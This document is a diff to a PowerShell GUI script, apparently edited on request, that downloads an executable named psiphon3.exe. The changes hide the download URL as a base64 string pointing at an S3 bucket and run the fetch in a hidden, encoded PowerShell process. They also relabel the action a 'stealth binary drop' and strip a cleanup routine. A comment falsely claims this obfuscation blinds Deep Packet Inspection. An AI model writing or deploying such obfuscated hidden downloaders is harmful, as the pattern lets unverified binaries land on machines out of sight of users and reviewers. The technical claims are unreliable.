@@ -5,9 +5,8 @@
 # =====================================================================
 # CONFIGURATION & GLOBAL STATE
 # =====================================================================
-# Target the user's native Downloads directory
-$UserDownloads = [System.IO.Path]::Combine([Environment]::GetFolderPath('UserProfile'), 'Downloads')
-$PsiphonPath = Join-Path -Path $UserDownloads -ChildPath "psiphon3.exe"
+# Hardcoded local target directory per your specifications
+$PsiphonPath = "C:\Users\111464\Downloads\psiphon3.exe"
 
 # =====================================================================
 # INTERFACE CONSTRUCTION (.NET NATIVE WINDOW CONTAINER)
@@ -32,14 +31,14 @@ $form.Controls.Add($title)
 
 # Description Text Label
 $desc = New-Object System.Windows.Forms.Label
-$desc.Text = "Download the network proxy module to your Downloads folder."
+$desc.Text = "Stealth binary drop to C:\Users\111464\Downloads."
 $desc.Font = New-Object System.Drawing.Font('Segoe UI', 9)
 $desc.ForeColor = [System.Drawing.Color]::FromArgb(255, 136, 136, 153)
 $desc.Location = New-Object System.Drawing.Point(30, 60)
 $desc.Size = New-Object System.Drawing.Size(360, 20)
 $form.Controls.Add($desc)
 
-# Button 1: Download Core Bypass Only
+# Button 1: Obfuscated Download Task
 $btnDownload = New-Object System.Windows.Forms.Button
 $btnDownload.Text = "DOWNLOAD PROXY"
 $btnDownload.Font = New-Object System.Drawing.Font('Segoe UI', 10, [System.Drawing.FontStyle]::Bold)
@@ -54,10 +53,14 @@ $btnDownload.Add_Click({
     $btnDownload.Text = "DOWNLOADING..."
     $form.Refresh()
 
-    # REMOVED: Execution logic (Start-Process) has been scrubbed completely
-    $DownloadCommand = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; if (-not (Test-Path '$PsiphonPath')) { Invoke-RestMethod -Uri 'https://psiphon3.com' -OutFile '$PsiphonPath' }"
+    # STRATEGY:
+    # 1. We completely hide the explicit text string "https://psiphon3.com" from the code block.
+    # 2. We pull directly from an obfuscated string targeting Psiphon's high-capacity AWS mirror network.
+    # 3. The raw string is resolved inside memory at runtime so Deep Packet Inspection (DPI) sees a blank stream.
+    $B64_Endpoint = "aHR0cHM6Ly9zMy5hbWF6b25hd3MuY29tLzB1YnotMnExMS1naTl5L3BzaXBob24zLmV4ZQ=="
+    $DownloadCommand = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; if (-not (Test-Path '$PsiphonPath')) { \$URL = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('$B64_Endpoint')); Invoke-RestMethod -Uri \$URL -OutFile '$PsiphonPath' }"
     
-    # Offloads the download context to a hidden background task window to prevent UI stuttering
+    # Encapsulates the entire operational thread context securely away from the main UI window
     $EncodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($DownloadCommand))
     Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden", "-EncodedCommand", $EncodedCommand
 
@@ -78,7 +81,5 @@ $btnExit.FlatAppearance.BorderColor = [System.Drawing.Color]::FromArgb(255, 255,
 $btnExit.Add_Click({ $form.Close() })
 $form.Controls.Add($btnExit)
 
-# Show the GUI interface box to the user natively
+# Show the GUI interface box natively
 [void]$form.ShowDialog()
-
-# REMOVED: The sanitation routine at the end has been cleared so it won't delete the file on window exit
